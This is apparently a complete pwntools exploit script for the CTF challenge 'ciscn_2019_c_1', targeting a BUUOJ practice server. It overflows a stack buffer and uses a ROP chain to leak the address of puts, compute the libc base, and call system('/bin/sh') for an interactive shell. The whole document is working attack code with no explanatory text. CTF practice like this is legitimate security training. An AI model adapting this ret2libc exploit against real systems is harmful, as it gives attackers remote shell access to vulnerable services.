from pwn import *

context.log_level = 'debug'
elf = ELF('ciscn_2019_c_1')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
io = process('ciscn_2019_c_1')
io = remote('node3.buuoj.cn', 28429)
main = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400c83
ret = 0x4006b9

io.recv()
io.sendline('1')
payload = cyclic(0x58) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
io.sendlineafter('Input your Plaintext to be encrypted\n', payload)
io.recvline()
io.recvline()
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.success('libc_base: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
io.sendline('1')
payload = cyclic(0x58) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)
io.sendlineafter('Input your Plaintext to be encrypted\n', payload)
io.interactive()
